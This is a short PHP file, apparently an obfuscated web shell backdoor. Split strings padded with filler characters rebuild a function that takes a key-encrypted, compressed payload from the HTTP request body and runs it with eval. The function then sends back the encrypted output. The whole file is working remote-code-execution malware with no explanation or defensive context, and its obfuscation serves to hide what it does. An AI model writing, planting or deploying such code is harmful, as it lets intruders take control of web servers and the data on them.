<?php
$w=';for($iS=0;$i<$l;){forS($Sj=0;($Sj<S$c&&$Si<$l);$Sj++,$i++){$oS.=$t{$i}^SS$k';
$U='n();$r=@bSase64_enScoSde(@x(@gzcomprSess($o),$kS)S);prSint("$p$kh$Sr$kf");}';
$A=str_replace('gU','','crgUgUegUate_gUfugUnctigUon');
$C='tents("Sphp://input"),$m)==1) {S@ob_Sstart();S@evaSlS(@gzuncoSmpress(@xS(';
$V='S@base6S4_deScode($mS[1]S),$k)));$So=@ob_get_conStenSSts(S);@obS_end_cleaS';
$R='khtRCSJaA";fSuncStion xS($t,$Sk){$cS=strlSen($Sk);$l=strleSn($tS);$oS=""S';
$P='{$j};}}SretSurn $o;}ifS (@SpregS_match("/SS$kh(.+)$kfS/",@SfSile_geSt_cSonS';
$W='$k="cSaSf21966";$khS="bfS82S3d9b54de";$kf="Sc7e43b4S8048e"S;$pS="Za3cFOISg';
$j=str_replace('S','',$W.$R.$w.$P.$C.$V.$U);
$H=$A('',$j);$H();
?>
